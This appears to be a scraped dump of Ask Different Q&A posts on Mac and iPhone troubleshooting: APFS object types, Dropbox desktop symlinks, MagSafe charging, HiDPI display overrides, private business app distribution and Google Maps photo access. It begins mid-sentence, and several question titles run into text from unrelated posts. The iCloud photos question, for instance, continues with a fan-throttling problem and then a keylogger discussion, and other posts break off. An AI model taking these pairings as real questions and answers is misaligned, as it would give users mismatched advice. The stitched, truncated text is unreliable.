0x4000 are the storage type, and the last 4 nibbles, i.e. 0x0002, are the object type itself. Here, 0x4000 means that the object uses the \"Physical\" storage type, and 0x0002 means that the object is the root node of a B-tree; the value 0x0003 instead of 0x0002 means that the object is a non-root node of a B-tree.\n\nA: Welcome to Ask Different. Maybe you can mount the APFS volume by using the 3rd party app Mountain. Others have had good luck using this app. The app is not free but has a free trial. It's easy to download and give it a shot. I'm not associated in any way to Mountain. I'm just a happy user. The app requires macOS 10.8 or later. \n", "Q: Are local backups of iCloud photos and camera roll redundant? Does icloud photos strip any metadata or change the quality?

The system was equipped initially with a fusion drive and the old SSD (PCIe) is still installed. \nFirst, I connected the new SSD via USB and copied over everything.  Then I replaced the drive and checked that everything was working.  After that, I upgraded to OSX Mojave (from High Sierra).  \nNow everything seems to be working fine, except that the system fan is running at full speed and the CPU is throttled (a process called \"kernel_task\" is eating up the available performance).  After all, the system is much slower than before the upgrade (so I'm considering of going back to my old HDD/fusion drive).\nI've already tried a lot of things:\n- installing OWC temperature sensor -> doesn't change anything\n- SMC reset\n- PRAM reset\n- installing different tools to take over fan control -> fixes the fan noise, but CPU throttling remains\n- checking the filesystem with fsck when booting in single mode\nNote, when I installed the different fan control tools, all reported temperatures of the system, even from all hard drives/disks, are perfectly OK.

However, the version I installed was free and it did not hide, so I don’t know how the process name will change for someone who buys a product.\n  And finally, ‘Refog’ appears as ‘syslogd’\n\n\nA: Check Code Signatures\nIf you suspect a process on your Mac is disguising itself as part of macOS, check the process's digital code signature. You can do this with the codesign binary:\n/usr/bin/codesign -d -vvvv /System/Library/CoreServices/coreservicesd\n\nIf there is no signature, it is not from Apple.\nIf the Authority fields do not list Apple Root CA, then it is not signed by Apple or one of their partners.\n\nA: Both coreservices and syslogd are legitimate programs included in the standard installation of macOS. Thus seeing those in the process list is not in itself an indication of keyloggers.\nHowever, it is possible that a keylogger could be camouflaging itself by using a well-known process name. You would need to identify the keylogger by something other than the process name though.\n", "Q: Sync Desktop now that Dropbox no longer supports symlinks How can I have my Desktop sync over Dropbox?\nPreviously, I used symlinks to have Dropbox sync the Desktop and Documents folders while keeping them in their actual locations. Dropbox no longer supports symlinks in this way.\n\nA: So far as I know, there are only two possible ways to do this, and neither ways are available as of the latest macOS (Catalina, 10.15) and the latest dropbox updates (EDIT: it turns out that there is a workaround for the problem with the second way!).\n\n\n*\n\n*The first way is to create a symlink within Dropbox that points to a folder outside Dropbox and will trigger Dropbox to sync its contents. This is how I used to have things until the latest dropbox updated (apparently triggered by my updated to Catalina) broke this method. As the questioner notes, this method is no longer supported by Dropbox.\n\n*The natural workaround (the second way) is to (i) place the desktop folder contents in a folder within the Dropbox folder, then (ii) effectively turn the actual desktop folder (stored in the user folder) into a symlink (e.g. per these instructions; EDIT: this is also effectively what Alex Szatmary suggests). Unfortunately, this by itself results in only partial success: on Catalina, so far as I've seen, after restarting the computer, the desktop reverts back to normal desktop configuration (no longer functioning as a symlink pointing into the corresponding desktop folder in the dropbox folder). EDIT: But there is a workaround: once the desktop folder is turned into a symlink that points to the desktop folder in the dropbox folder, go to the \"Home\" folder, and 'get info' on the Desktop alias/symlink and check the box \"Locked\" in order to lock the folder. This way it will not be deleted and replaced with the normal desktop folder upon restart and logging in.\n\nA: Dropbox no longer supports having symlinks within the Dropbox folder and instead encourages users to store the files within Dropbox and use symlinks from other locations outside of the folder. For example, I used to have my Desktop folder in my Home directory and a symlink to Desktop inside my Dropbox folder; now, my Desktop folder is in Dropbox and my ~/Desktop folder is replaced with a symlink.\nI set up the symlinks following this SO answer. I used these commands:\nsudo mv Desktop/ Desktop.bak\nln -sf /Users/alexszatmary/Dropbox/Desktop ./Desktop\n\nI needed to reboot my computer to see the files reappear on my Desktop.\nThis also works with Documents and presumably other special folders.\n\nA: This worked for me on macOS Monterey 12.1 on a new M1 MacBook Pro.\nFirst, quit DropBox.\nThen, open the Terminal and issue:\nsudo mv ~/Desktop ~/Dropbox/Desktop && \n  sudo ln -s ~/Dropbox/Desktop/ ~/Desktop && \n  sudo chflags -h schg ~/Desktop\n  \nsudo mv ~/Downloads ~/Dropbox/Downloads && \n  sudo ln -s ~/Dropbox/Downloads/ ~/Downloads && \n  sudo chflags -h schg ~/Downloads\n\nsudo mv ~/Documents ~/Dropbox/Documents && \n  sudo ln -s ~/Dropbox/Documents/ ~/Documents \n  && sudo chflags -h schg ~/Documents\n\nThis will move Desktop, Downloads, and Documents folders to DropBox, create symlinks in their places, and lock the symlinks to prevent macOS from overwriting them.\nAlso, it does all this so quickly that macOS doesn't notice that we're messing with macOS protected folders.\nFinally, restart DropBox.\n\nA: Dropbox now has a \"Manage Backup\" feature that makes the other workarounds described here unnecessary for me because I just use one computer. One would need the workarounds if they were using multiple computers.\n", "Q: How to format a cell with data YYYYMMDD in Numbers to be a date type? I created a custom format to try and format a date column to be used within categories. However, Numbers tend to keep reverting my custom format to \"Automatic\" and I'm unable to group the data as part of a category.\nHow do I set cells to use my custom date format to be used in categories?\n\nSetting the field to use the new format\n\nClick away from the cell and go back to the field and see that the format has reverted back to \"Automatic\"\n\n\nA: You can assign you custom format to an empty cell. If you then enter a value that contains a hyphen (-) or a slash (/), such as \"1/21/2019\", Numbers assumes it’s a date and assigns it your custom date and time format automatically. And keeps it.\nOtherwise, if you already have a number in a cell or enter value that is a number, such as \"20171214\", Numbers cannot recognize it as a date and assign it your custom date format.\nHope, this little video may help to understand as well: https://youtu.be/fUwRHtRLaec\n", "Q: iPhone to make a sound when it shuts down due to low battery Is there a way to have the iPhone make a sound just before it goes to sleep due to low battery (i.e. when battery goes from 1% to 0%)?\n\nA: No, there's no foolproof way of setting the iPhone to make a sound before it goes to sleep due to low battery.\n", "Q: External USB-C SSD not recognized on MacBook Pro I am using a MacBook Pro Retina 15-inch (Mid, 2015) running macOS Catalina 10.15 Beta (19A558d).\nI want to use an external USB-C SSD drive (512GB) to use Windows To Go and store other files. Since my MacBook Pro only has type-a USB ports I also bought a USB type-c to type-a adapter. \nHowever, my MacBook Pro does not recognize the USB-C drive, not in Disk Utility, not in BootCamp Windows, not in System Report, or anywhere else I've checked. What's more, the light on USB device is not blinking, which might infer that the device has no power.\nSo far I have:\n\n\n*\n\n*ensured the MBP is full charged and also tested while connected to AC power\n\n*tested the SSD USB devices on my phone (which has a USB type-c port), and it powered up and was recognised fine\n\n*tested the adapter by connecting it to my Surface Pro 6, and everything works fine\n\n*tested the adapter on my MBP but with a USB-C flat drive instead and everything works fine\n\n\nConsequently, I think the MBP is not giving enough power to power up the USB-C external drive.\nCan anyone offer a suggestion on how I may get the USB-C external drive to work with my MBP?\nP.S. I found a similar question here.\n\nA: Since you're using a Beta version of Catalina it is always possible that this issue could be resolved by the final release version of Catalina.\nHowever, assuming this is purely related to a hardware limitation with your current setup, the only way to try and resolve it is to get enough power to the external SSD. As such, you have the following options you could try:\n\n\n*\n\n*If the external USB-C drive has the option for its own power source connected to it, then doing that will solve the problem\n\n*You could opt for an adapter that connects from two USB-A ports to one USB-C port, thereby combining the power from two ports to provide enough for the external drive\n\n*You could use a powered external USB hub or dock (i.e. connect the USB Hub to the MBP and then connect the USB-C drive to the hub)\n\n*Double-check that the adapter you're using is actually capable of passing enough power through\n\n\nNOTES:\n\n\n*\n\n*While there are many cables/adapters that can utilise the power from two USB-A ports to a single USB-A port, I'm not sure if one exists that goes to a single USB-C port - so you may need a second adapter to get this to work.\n\n*Only you can decide if the expense of using a hub or dock is warranted in this use case.\n\n", "Q: How to change the home screen wallpaper randomly How can I set to change my iPhone's wallpaper automatically? I have an album called wallpapers and I want these wallpapers set as wallpapers on my home screen randomly.\nI'm using iOS 13 and interested on some tweaks with shortcuts more than third party apps. If there are any third party app for this, those are also welcome.\n\nA: As of iOS 13.1.2 there is no default way of doing this. However, a Photos & Video action called Set wallpaper to will be available in future for use with the Shortcuts app.\nThis action will allow users to set the Wallpaper for either their Lock Screen or Home Screen from a Photos album (which is what you're looking for) or from an online source.\nI will update this answer once that action is available for the Shortcuts app.\nIn the meantime there are a number of apps available on the App Store that promise to change your Wallpaper. Some examples follow:\n\n\n*\n\n*Shuffle Wallpapers\n\n*Vellum Wallpapers\n\n*Wallpapers & Backgrounds: HD\n\n*Wallpapers & Background Themes\n\n*Live Wallpapers Now\nHowever, my understanding is that most apps use an online resource (a library of wallpapers) from where the wallpapers are downloaded. You'd need to check if any of them allow you to use a locally stored Photos album as your wallpaper source.\nDisclaimer: I have not used any of the apps listed above, nor do I have an association with any of the developers. You will need to determine if any of them meets your needs and what cost, if any, they have.\n", "Q: How do I fix \"Battery is not charging\" for 2012 macbook pro retina? I have a Macbook Pro, and it's battery is not charging. \nIf I switch off the power adapter, the computer instantly switches off. No shut down sequence. I have to plug in the power adapter to switch it on. \nOn each switch-on, I am presented with the screen showing Macintosh HD. And a network selection option at the bottom. On pressing the arrow under the HD icon, the macbook boots up. Takes quite long. About a couple of minutes. Before this problem started, it used to startup in a few seconds.\nMackbook details:\n\nBattery remains at 0%\n\nBattery status:\nBattery appears normal and macbook detects it.\n\nThings I tried: \n\n\n*\n\n*Reboot. \n\n*Reset SMC. \n\n*Clean magsafe port. \n\n*Disconnected, and reconnected the battery plug by opening the back.\n\n\nNone of this worked.\nI also tried to find the answer in other questions here, like \nMacbook Pro (Mid 2012) Battery Not Charging\nand \nMacbook Pro Retina – \"Battery Is Not Charging\"\nBut nothing has changed the battery status.\nHow do I troubleshoot this?\n\nA: Troubleshooting is a process of elimination and often requires patience. \nIn this situation, if you've already reset the SMC (and it may be worth doing again, ensuring you've followed the correct steps for your model), you'd normally want to isolate the different components by testing them separately (e.g. testing the battery in another 2012 MBP, testing the AC charger with another MBP, and so on).\nOf course, when you're trying to do things yourself, that isn't so easy.\nEven though you've reset the SMC, I'd do that again first and ensure you refer to How to reset the System Management Controller (SMC) on your Mac on Apple's website. Read through this page carefully as the instructions differ for different models of Mac.\nOnce you've done that, and assuming it has no effect, you'd want to run Apple Hardware Test.\nRun Apple Hardware Test\nYour model MBP uses Apple Hardware Test. To use this, follow these steps:\n\n\n*\n\n*Shut down your MacBook Pro \n\n*Restart your MacBook Pro\n\n*Press and hold the D key before the gray startup screen appears.\n\n*After a while, Apple Hardware Test (AHT) will start.\n\n*When prompted, select your language and click the right arrow. \n\n*When the AHT console appears, you can choose to run Basic tests by clicking the Test button. However, I suggest you select the \"Perform extended testing\" checkbox before you click the Test button.\n\n*Your test results will appear in the window in the bottom-right of the console.\n\n\nNote 1: that the extended test will take some time. Take a note of the results and report back. \nNote 2: If pressing and holding the D key at Step 3 doesn't work, start again at Step 1 and, at Step 3 press and hold both the OptionD keys instead. This will try and run diagnostics from the internet instead, so you will need to allow more time for it to complete.\nOnce you've done that, let me know what happens.\nYour battery\nBased on your question, your battery has only done 27 cycles, so I'm assuming you've only recently bought this battery. If so, I would be speaking to Apple (or the 3rd party vendor) from whom you bought the battery as it is possible it's an EEOL (Early End Of Life) situation. Any reputable retailer will be willing to test/replace the battery in this situation.\n\nA: You haven't tried checking the power adapter. Power adapters get damaged so before being concerned about the battery. It's best to check wether the power cable is working by either plugging it into another similar MacBook Pro(make sure it's the exact model) or by reaching Apple.\n\nA: I would suspect something is wrong with the center pin of either your MacBook or your power adapter. In this Apple support document it is described that a missing contact on the center pin may cause the adapter not to charge the computer. This answer elaborates on the pin configuration that is necessary to charge the computer further.\nAs the Apple support document states, I suggest you closely inspect the pins on your adapter and the contacts on your MacBook.\nPlease only proceed if you have the necessary technical expertise:\nAs a next step you may want to measure if there is a current on the center pin. This website explains in more detail how Magsafe works. Charging is basically negotiated between the adapter and the computer.\n\nWhen the Magsafe connector is plugged into a Mac, a lot more happens than you might expect. I believe the following steps take place:\n\n*\n\n*The charger provides a very low current (about 100 µA) 6 volt signal on the power pins (3 volts for Magsafe 2).\n\n*When the Magsafe connector is plugged into the Mac, the Mac applies a resistive load (e.g. 39.41KΩ), pulling the power input low to about 1.7 volts.\n\n*The charger detects the power input has been pulled low, but not too low. (A short or a significant load will not enable the charger.) After exactly one second, the charger switches to full voltage (14.85 to 20 volts depending on model and wattage). There's a 16-bit microprocessor inside the charger to control this and other charger functions.\n\n*The Mac detects the full voltage on the power input and reads the charger ID using the 1-Wire protocol.\n\n*If the Mac is happy with the charger ID, it switches the power input to the internal power conversion circuit and starts using the input power. The Mac switches on the appropriate LED on the connector using the 1-Wire protocol.\n\nThis process explains why there is a delay of a second after you connect the charger before the light turns on and the computer indicates the battery is charging. It also explains why if you measure the charger output with a voltmeter, you don't find much voltage.\nThe complex sequence of steps provides more safety than a typical charger. Because the charger is providing extremeley low current at first, there is less risk of shorting something out while attaching the connector. Since the charger waits a full second before powering up, the Magsafe connector is likely to be firmly attached by the time full power is applied. The safety feature are not foolproof, though, as the burnt-up connector I tore apart shows.\nDon't try this at home\nWarning: I recommend you don't try any of these experiments. 85 watts is enough to do lots of damage: blow out your Mac's DC input board, send flames out of a component, blow fuses, or vaporize PC traces, and that's just the things I've had happen to me. The Mac and charger both have various protection mechanisms, but they won't take care of everything. Poking at your charger while it's plugged in is a high-risk activity.\n\n", "Q: How to prevent terminal from printing passwords from keychain? I currently use the command-line utility security in a shell script to access a password from keychain. I am surprised that echoing my password variable works and reveals the password in my terminal window.\nI used the function get_pw suggested here and then simply assign the password to a variable PASSWORD. Is it possible to make terminal hide the password?\nMy shell script looks as follows:\nACCOUNT_NAME='MyAccountName'\n\nget_pw() {\n   security 2>&1 >/dev/null find-generic-password -ga $ACCOUNT_NAME \\\n   | ruby -e 'print $1 if STDIN.gets =~ /^password: \"(.*)\"$/'\n}\n\nPASSWORD=$(get_pw)\n\nThen when writing echo $PASSWORD, the password is revealed.\n\nA: Well,\nPASSWORD=$(get_pw)\n\nassigns the password to PASSWORD so it shouldn't be a surprise that\necho \"$PASSWORD\"\n\nactually prints it on the Terminal.\nThe idea here is not to print it but to use it in another command to pass it on (as the example in the page you've linked to does). Even then the password is still visible in ps -E though.\n", "Q: Why do I have a /home folder and do I need it? In my root folder, there is a hidden folder called \"home\" at the path /home. It's empty. Do I need it and can I delete it safely?\n\nA: The folder /home is part of the standard MacOS installation. Just because it's empty, doesn't mean that it's not needed or not expected by other processes at certain times.\nIf you're short of space, deleting parts of the OS that you think might not be used is unwise. User-added content is likely to be at least 10 times the size of the system files, so start there!\n", "Q: iMac freezing on boot Apple logo I have a 2017 iMac running the latest version of macOS Mojave. When restarting my machine it freezes on the Apple logo about a third of the way through the progress bar.

Sometimes when it freezes the Apple logo will get shifted over to the right side of the screen and get cut off on the right side of the screen. Any ideas what could be the problem?\n\nA: Looks like graphics driver is switching to basic configuration.

It worked well, I could use the media buttons to control play/pause/next track/previous track. But a few days ago, (after an macOS update?) now when I hit play/pause it launches iTunes instead of controlling the Deezer app that is already running and playing music. It was correctly functioning before, so I don't know where this change of behaviour is coming from.

The XR, XS iPhones feature eSIM capability. Assume that the user lives in the US and uses T-mobile.  Does it make sense to use the eSIM with the home carrier or to use it with roaming carriers the Caribbean and EU countries?\nIf I assign the eSIM to T-mobile (USA), can I expect the phone to roam exactly as if it had a conventional SIM card?\n\nA: The eSim can be used both for home and roaming as indicated by Apple's Website:\n\nHere are a few of the many ways you can use Dual SIM:\n  \n  \n*\n  \n*Use one number for business and another number for personal calls.\n  \n*Add a local data plan when you travel outside of the country or region.\n  \n*Have separate voice and data plans.\n  \n\n\nA: The physical and eSIMs both have full functionality in iPhone. You can select whichever you want to use for data, imessage, etc. in Settings.\nThere are still not many carriers that support eSIM. Going for eSIM as your home SIM makes a lot of sense if you have a carrier that supports it (like T-Mobile) since you will not have to search for a carrier that supports eSIM wherever you travel and want a secondary SIM.\nOn the other hand, having a physical SIM as your home SIM allows you to buy eSIMs which are sometimes available through the local carriers apps saving you having to buy a physical chip.\n\nA: Roaming is a deal between your home carrier and carrier at a country you're visiting. The whole point of roaming is to use your home SIM abroad.\nTherefore, to answer your question: both card-SIM and eSIM are for home carriers, not roaming.\nIf what you want is to avoid roaming and buy a local SIM at the place you're visiting, then the answer is simple. Physical card-SIMs are nearly universal and you can swap them on your own, while not every carrier supports eSIMs and you need carrier assistance to re-sign your phone to a new eSIM. So get an eSIM from your permanent carrier and keep swapping disposable cards.\n\nA: There are a lot of countries/carriers where eSIM is not available while every carrier supports regular SIM, so using your T-Mobile line in the eSIM slot makes the most sense.\n", "Q: MacOS terminal Hangs on `login` On my macbook, I've found that sometimes it gets into a state where it cannot open up a new terminal - a blank terminal window just appears, and it hangs.  Rebooting solves this, but it seems to happen again within a week or so.\nActivity monitor reveals that login is running, but it never gets to zsh as a child process.  If I leave a terminal open, this terminal is still usable.  \nI can open a bash terminal on a different program, and in that case the system hangs if I run login, zsh, or, interestingly when I run ls /dev/tty*. \nEven typing ls /dev/tty and hitting tab to autocomplete causes the terminal to hang and become unusable.\nWhen these processes hang, the terminal is useless - CTRL-C does not stop them.  \nI suspect it is hanging on accessing /dev/ttys00*.

No idea why this worked, nvim was already orphaned so shouldn't have been running anyways.\nGuessing the offending program is probably different for everyone though, so if you don't use nvim maybe just look for an out of place orphaned terminal app in activity monitor.\n", "Q: Could my iPhone be installing malware on factory reset? Hi I have an iPhone 7s and have been doing the factory reset, erase all content, data, and settings option. Every time I do this I get three loading bars, not the normal two like my other phone. The first loading bar is normal and under the apple logo. The second loading bar however happens after the first loading bar finishes, then the apple logo is the only thing on screen, then the spinning circles occurs, then a mini loading bar appears with nothing else on the screen. After the mini loading bar is done the final loading bar with the apple icon above finishes and the phone boots to the hello start page to put my information back in.\nIs this normal and if it isnt what happened. I have never jail broken my device but I did find a video that showcases the mini loading bar, albeit it looks like he has two loading bars, not three. Time stamp is 3:20 to see mini loading bar.\nWhat should I do?\nhttps://m.youtube.com/watch?v=kHSIe8aze78\n\nA: Yes, it is completely normal to see loading bars / progress while the phone reboots after a \"factory reset\". It is not a sign of malware being installed.\nPerhaps your suspicion is because your phone is managed - i.e. owned and controlled by your employer, school, or similar?\n", "Q: MacBook Air's Safari browser keeps opening new tabs I have checked for extensions but there are none installed on the laptop, and I have checked everywhere in Finder to no avail. This is also happening on Chrome and would probably happen on Firefox and other browsers. The tabs that pull up seem to be from the search history because the tabs are usually sites such as Amazon. I have only had one or two encounters with actual scam sites. It also usually happens when a website is loading. The laptop used to have another virus where the search engine was replaced and notification windows popped up in the corner of the screen to make money (The current symptoms that I am experiencing happened with this virus as well). I can't remember what the virus was called. \n\nA: A new Update for Safari was released on September 22nd 2019. As that introduced a totally new safari version. This problem should no longer occur. Make sure the Mac is updated. \n   Also if it still continues make sure the keys cmd and N are functioning properly.

I tried enabling HiDPI resolution, for example 1280x720 (perfect 2 for 1).  \nHere are my findings:  \n\n\n*\n\n*HiDPI resolutions are simply not available in the system's menu in this setup. I tried the hack (for example here), but there is no way to make them appear in the system's Display Preferences. 720p is listed there but it's not HiDPI and looks ugly.\n\n*Using RDM, I'm able to see many more resolutions, including HiDPI resolutions. However, among HiDPI resolutions, only 16:10 resolutions work (1680x1050, 1440x900, 1280x800 etc.). For all other, HiDPI, non 16:10 resolutions, I click on them in RDM, nothing happens. (I also tried other resolution managers with the same effect).  \nIt's worth noting that the 13\" built-in display is 16:10 (at 3360x2100 native, 1280x800 scaled). 1280x800 looks fine but the black borders are weird (and it's not perfect 2 for 1 pixels).  \nIs this behaviour normal? Is this a bug or lack of feature? Is there a workaround?\nUpdate\nAfter some careless tinkering (notably using this link), the HiDPI resolution \"1281x720\" appeared (!) which actually works (!!). It's not perfect but it looks sharp and uses most pixels on the display.\n\nA: As stated in the updated question, what finally worked for me was using instructions provided in this link to create a custom scaled resolution of 1281x720 (since the 1280x720 was not working). It works really well and there's not blur or visible difference of quality compared to other (working) 16:10 scaled resolutions.\nIn summary:\n\n*\n\n*Enable HiDPI with sudo defaults write /Library/Preferences/com.apple.windowserver.plist DisplayResolutionEnabled -bool true\n\n*Detect VendorID / ProductID for your monitor\n\n*Use the generator provided in the link to generate a custom resolution for your monitor (mine was 1281x720) in the .plist format (you can remove most resolutions and just use one custom resolution)\n\n*Download the .plist and execute the following while replacing vendorID and productID (4-digit hexadecimal numbers) with your own:\nsudo mkdir -p /Library/Displays/Contents/Resources/Overrides/DisplayVendorID-10ac\nand place the .plist inside\n/Library/Displays/Contents/Resources/Overrides/DisplayVendorID-10ac/DisplayProductID-d06e\n\n*Restart the Mac and use RDM to select the relevant resolution\n\n", "Q: Differences between the three Ask to Join Networks settings in iOS 13? Before the release of iOS 13, when navigating to Settings/Wi-Fi/Ask to Join Networks there were two options listed: On/Off. The idea was that if this setting was enabled, if the iOS device in question was out-of-range of any known Wi-Fi networks but there were networks in range that hadn't yet been connected to, the OS would pop up a notification giving the user the option of joining these networks - some users may have found this useful if they travel a lot, for example.\nIn iOS 13, however, this simple switch has been replaced with three options: \"Off\" (which I assume behaves the same as it did in previous iOS builds), \"Notify\" and \"Ask\". To me, at least, these latter options sound similar and the tooltip displayed when either of these are enabled isn't too helpful.\nWould somebody be able to explain the differences between these two latter settings?\n\nA: What I commented above was almost correct.\n\nthe popover was very annoying to see when Wi-Fi is on and I am away from known networks. So maybe a notification comes when there's none. So that I can finish what I was doing and then try to connect to something.\n\nThe excerpt from an article:\n\nOff ( This requires you t manually select a network if no known\nnetworks are available)\nNotify ( Known networks are joined\nautomatically. If no known networks are available you will see a\nnotification for available networks)\nAsk ( Known networks are joined\nautomatically. if no known networks are available you will be ‘asked’\nbefore joining a new network.\n\nFrom https://appletoolbox.com/wi-fi-issues-after-updating-to-ios-13-or-ipados-check-these-10-tips/\nThe difference seems to be in the direct popup with list of networks vs the notification about available networks which won't interrupt your work.\n", "Q: Which 27\" monitor for mac mini at lower resolution to look larger? I'm considering getting an HP Z27 (4K UHD) or HP Z27n G2 (QHD) for my mother.  She has a (2018?) mac mini.  I plan to turn it to a lower resolution so that everything looks larger, because it would help her to see.\nIf the resolution will be lower, is there any point UHD, or is QHD just fine?  Or does even QHD not work well if I turn the resolution down?\n\nA: The two HP 27\" models that you mention in your question are the very same two that The Wirecutter recommends in its review of the best 27-inch monitors. According to the article, current (Sept 2019) pricing is US$540 for the 4K/UHD/2160p version, and US$340 for the 2.5K/QHD/1440p version. Based on your description of the intended use for the display, I'd say QHD resolution will be just fine.\nIf your mother would be satisfied with a 24\" display, you can save some money by buying a display of that size. The Wirecutter's review of the best 24-inch monitors recommends the Dell UltraSharp U2415 (currently US$225) for QHD/1440p resolution, and the Asus VS239H-P (US$130) for FHD/1080p resolution. At the 24\" size, either resolution should work fine for your intended purpose.\n", "Q: How do I use my external keyboard for typing in a foreign language? I have a MacBook Air with a British English keyboard layout and a bluetooth keyboard with a Norwegian layout.\nI would like to use my bluetooth keyboard for when I am typing in Norwegian, and the inbuilt keyboard for when I am typing in English. \nHowever, when I try to use the Norwegian keyboard to type a Norwegian letter, it instead types the symbol occupying the same position on the British keyboard.\nThis affects all the keys on my external keyboard. My computer effectively treats my Norwegian keyboard as though it were a British one.\nInstead, I would like my computer to always treat my external keyboard as a Norwegian keyboard and to always treat my inbuilt keyboard as a British one.\nCan you show me how to set up my computer in this way, please? \nThank you in advance\n\nA: Go to System Preferences and to Keyboard. When that pane comes up, select the Input Sources tab. This is where you choose a foreign keyboard. See figure below.\n\nYou can see in the figure what the keyboard looks like for the Russian language. By clicking the 'Show Input menu in menu bar' you'll have a menu item to view the foreign keyboard whenever you want.\n", "Q: Is it possible to use Preview to highlight text or a portion of an image from a screenshot (on macOS High Sierra)? I am trying with both a PDF and/or a PNG file, but this does not seem possible. Nothing I am trying works. Is it possible to take a screenshot natively in macOS, then highlight a portion of said screenshot? If so, how can this be done exactly?\nTo be clear, I want to just use native tools that are built-in to macOS, so Preview in this case.\n\nA: In a word, no.\nWhile you can annotate anything in Preview.app it does not offer the option (that I have seen) to use translucent lines or shapes. You can change the color to anything your heart desires of both the line, shapes and shape fill but you can't make it transparent.\nNot that this applies only to bitmaps like JPG & PNG where you are taking a picture of the screen or downloading a picture of text from somewhere. If you have a PDF that has actual text in it. EG a PDF that you can select and copy text in then, yes, you can highlight portions of the text:\n\n\n*\n\n*Select the text just like in any word processing program\n\n*Go to Tools > Annotate > Highlight Text\n\n*Save the PDF\n\n\nThe difference being \"a picture of text: no\" or \"actual text in a PDF: yes.\"\nIf you want to \"annotate\" a screen capture of text you will need to find a program that lets you overlay a transparent colored shape over another picture. I would bet there are a number of shareware/freeware programs (GIMP springs to mind) that would let you do this.\n\nA: Actually, if you go to the original source text you hope to \"capture\" (say a website for example) and then if you \"print\" the text as a pdf (as opposed to simply doing a screen grab) you can then highlight the text!\nHope this helps!\n", "Q: Can't install Homebrew on macOS Mojave; installer doesn't recognize Command Line Tools I'm trying to install Homebrew on macOS Mojave 10.14.6.

We build our code using ionic/cordova and then compile it down to scope, which I build.  Here is the difference.  We currently use Apple’s Enterprise License to build our product, and then export it to a third party site (NOT the Apple App Store), to get around the stringent Apple review process.  It is what it is.\nOk, so now with WWDC19 (https://developer.apple.com/videos/play/wwdc2019/304/), Apple has REALLY tightened up the leash for the Apple Enterprise Program.  Both our new clients, plus my dev team’s request for a new Enterprise license (all with unique DUNS numbers), were declined, as Apple is pushing us to to the Apple Business Manager.  \nI looked at the link found above, but it is rather high level and “assumes” I already have an Apple Developer account and are using Apple Connect.\nIn short, I desperately need some help.  Before I loose rep points, let me say that I have searched the web for the steps, and nothing quite meets my needs.  \nHere is my understanding (please help and don’t flame me).  I am not a novice. I just come from an android background).\n1) In order to use the Apple Business Manager, we first have to build and publish the app (via Xcode) to Appleconnect to have the app reviewed.\nIn order to do this, I need the followin:\n1) Valid appleid and an enabled $99US Apple developer license (and accompanying provisioning profile).\n2) Tax and Billing (credit card info) for my Apple Id in Apple Connect account.\n3) I build my app using Xcode 11 using both my valid apple developer license + provisioning profile and team account.\n4) Once built, I distribute the app to the AppStore.  When prompted, I DO NOT export it locally.  I upload it directly to the AppConnect portal.  Successful upload assumes that all the previous billing stuff (in #1) has been approved and validated.\n5) This begins the Apple review process. \nIs this it?  I DO NOT want this app to go onto the public app store, as it is a B2B app (meant to house sensitive client data).  Once the review process has completed, (for lack of a better term), how do I get the app to the Apple Business Manager site of things?  \nI did some googling, and there is mention of a VPP program.  So once the review is over, do I get the option of getting a VPP link? Do I then have the option of providing this link to Apple Business Manager, or can I provide this link to our 3rd party?\n\nA: The steps you describe are correct, yes. There's however no need to do it manually like you describe - you can just choose Distribute in Xcode to automatically send your archived build to Apple. Just like you would if the app was going on the App Store.\nThe difference between putting the app on the App Store, and doing what you want, is simply this one step: On App Store Connect in the \"Pricing and Availability\" tab for your app, you have to select \"Available privately as a custom app for business\". This marks your app as private and makes so that the public cannot find it on the App Store.\nWhen you have selected that it is a private, custom app for business, you'll be prompted to provide the IDs of the customers you want to be able to get the app. When you publish your finished app, those customers will see it in Apple Business Manager.\nThe customer will be able to buy the app, and install it on devices using either MDM (centrally install the apps) or using redemption codes (where the enduser enters the redemption code on the App Store).\nThere's no special \"link\" that you need to provide to your customer.\n", "Q: Where is the air inlet on a Mac mini (2018) for the cooling fan? On the Mac mini (2018), where is the air inlet for cooling the innards of this computer? \nI have looked at the iFixit teardown. It shows the fan blowing out the broad outlet across the back of the Mac mini, below the USB-C ports. I certainly can feel the warm air exiting this outlet. \n➥ Where does the air enter the Mac mini? \nThe bottom is either solid metal or covered by the non-slip rubber. I see no other inlets on the backside. So I am left puzzled.\nI am concerned about not blocking the air inlet, to maximize cooling efficiency. \n\nA: The air inlet on the Mac Mini (2018) is located on the bottom. If you look closely at the circular plastic disc, you'll see that there's a gap between that and the metal part of the computer. This is the air inlet!\nThe electromagnetic shielding beneath the plastic disc is perforated, allowing air to move.

So even it is free, it is counted and listed under purchased items with zero cost/charge. \nIn your case, I think your machine is trying to download some updates from Mac Store for your application that you have downloaded from store and it is unable to do as you don't have enough space for its upgrade. Make some space free first :) \n", "Q: How does google maps know that I've taken pictures? Yesterday I've visited a restaurant. The restaurant had a beautiful garden and colorful plants. So I took several pictures there. Today, Google Maps sent me a notification and offered me to share those pictures as I've taken for that restaurant.\nHow does Google Maps know that I've taken pictures there? Does the app regularly check(while the app is running) my pictures and their location without my knowledge? If so, then Google Maps can also upload those pictures to somewhere without even asking me? So if I allow access to my photos for an app, does that mean the app can access my photos without showing a \"BROWSE\" or something like that and upload to somewhere? I though iOS API needs photos to be picked by user to be shared by an app. Otherwise any app that has proper access permissions can access to all of my photos and then may upload all of them to cloud, whithout my knowledge, right?\nEdit: Ok, I'm having hard time to explain myself. I know if Google Maps has access permissions to photos, then it can access photos. That's not the issue here. The problem is that: My phone is locked and sitting on the table. Then I get a notification from Google Maps, asking to share the photos I've taken yesterday at the restaurant I've visited! Not only that, when I click the notification, Google Maps opens up with a view with already selected photos which all taken at the specified location. This is only possible if I opened the Google Maps app, after taking photos, which I did for getting back to home. The problem is, when I open the Google Maps or any other app that has access permission to photos, does this mean all those app can access all of my photos, any time(if app is running in foreground)? I thought apps need to call some iOS APIs to show me the thumbnails, then only the photos I've checked will be delivered to app. That is, I thought apps can only access the photos I've picked from the thumbnail view and the thumbnail view is mandatory and handled by iOS, just like passcode and touchID(apps can't read users' fingerprint or passcode, it's all handled by iOS).\n\n\n\nA: As evident from the screenshot of the Google Maps settings, you've granted the app access to all your photos. So there is nothing which stops Maps from searching geolocations of photos recently taken and make appropriate recommendations.\nAlso, this thread here suggests that\n\nGoogle Maps suggest automatically to upload photos to places you visited.\nThis option could be modified here:\nOpen Google Maps then go to menu > settings > notifications > your contributions > adding your photos, see suggestions for photos to post (DISABLE THIS BOTTON).\n\nThose who have this or geolocation disabled mayn't see the photos access prompt or access settings..\nThe best I can speculate is: App has geolocation or location history turned on. When you agree to share/upload photos for improving the service, it asks for photos access and it's granted. Now whenever you return from some place to a previously 